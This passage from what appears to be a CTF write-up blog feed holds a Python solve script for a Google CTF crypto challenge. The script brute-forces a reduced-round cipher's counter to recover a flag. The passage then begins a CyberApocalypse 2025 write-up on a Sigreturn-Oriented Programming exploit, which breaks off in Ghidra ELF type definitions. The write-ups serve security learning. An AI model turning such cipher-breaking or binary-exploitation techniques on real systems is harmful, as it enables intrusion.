class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_counter_variations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_package_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_package_file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000010000000000000000000&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_target_counter_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;message_size_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;5c54700231f4727bf7d49234e7bbb1c9&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#secret_target_nonce_hex = &apos;000010000000000000000000&apos;
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#secret_target_counter_int = 1
&lt;/span&gt;    
    &lt;span class=&quot;n&quot;&gt;selected_constants&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zeros&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;secret_target_nonce_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_structured_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;known_structured_key_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#print(f&apos;INFO: Known structured key for player: {known_structured_key_hex}&apos;)
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#p_common_bytes = os.urandom(message_size_bytes)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;692f09e677335f6152655f67304e6e40141fa702e7e5b95b46756e63298d80a9bcbbd95465795f21ef0a&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p_common_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;flag_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_common_hex&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p_secret_flag_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#print(f&apos;Encrypting the secret flag string (\&apos;{flag_string[:20]}...\&apos;) with the KNOWN key using SECRET target_nonce/counter...&apos;)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;c_target_flag_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_counter_int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;n&quot;&gt;data_bytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_constants_tuple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;selected_constants&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;c_target_flag_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_target_flag_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#print(c_target_flag_hex)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_target_flag_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;CTF{w3&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#challenge_package_data = {&apos;cipher_parameters&apos;: {&apos;key&apos;: known_structured_key_hex, &apos;common_plaintext&apos;: p_common_hex}, &apos;learning_dataset_for_player&apos;: learning_dataset_entries, &apos;flag_ciphertext&apos;: c_target_flag_hex}
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#main()
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;000022200000000000000000&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#solve(&apos;000010000000000000001000&apos;, 2)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Mon, 04 Aug 2025 00:00:00 +0200</pubDate>
        <link>http://localhost:4000//GoogleCTF-Crypto-Numerology</link>
        <link href="http://localhost:4000/GoogleCTF-Crypto-Numerology"/>
        <guid isPermaLink="true">http://localhost:4000/GoogleCTF-Crypto-Numerology</guid>
      </item>
    
      <item>
        <title>CyberApocalypse 2025 - Laconic</title>
        <description>&lt;h3 id=&quot;using-sigreturn-oriented-programming-srop&quot;&gt;Using Sigreturn-Oriented Programming (SROP)&lt;/h3&gt;

&lt;p&gt;It was decompiled trought ghidra as you can see there’s&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf_ProgramHeaderType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_NULL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_LOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_DYNAMIC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_INTERP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_NOTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_SHLIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_PHDR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_TLS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_GNU_EH_FRAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1685382480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_GNU_STACK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1685382481&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PT_GNU_RELRO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1685382482&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf_ProgramHeaderType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Phdr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Phdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PElf64_Phdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Phdr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf_ProgramHeaderType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_vaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_paddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_filesz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_memsz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Sym&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PElf64_Sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Sym&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_other&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_shndx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;qword&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;st_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Shdr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf64_Shdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PElf64_Shdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf_SectionHeaderType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_NULL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_PROGBITS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_SYMTAB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_STRTAB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_RELA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_HASH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_DYNAMIC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_NOTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_NOBITS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_REL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_SHLIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_DYNSYM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_INIT_ARRAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_FINI_ARRAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_PREINIT_ARRAY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_GROUP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_SYMTAB_SHNDX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_ANDROID_REL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1610612737&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_ANDROID_RELA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1610612738&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_GNU_ATTRIBUTES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048181&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_GNU_HASH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048182&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_GNU_LIBLIST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048183&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_CHECKSUM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048184&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SHT_SUNW_move&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1879048186&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
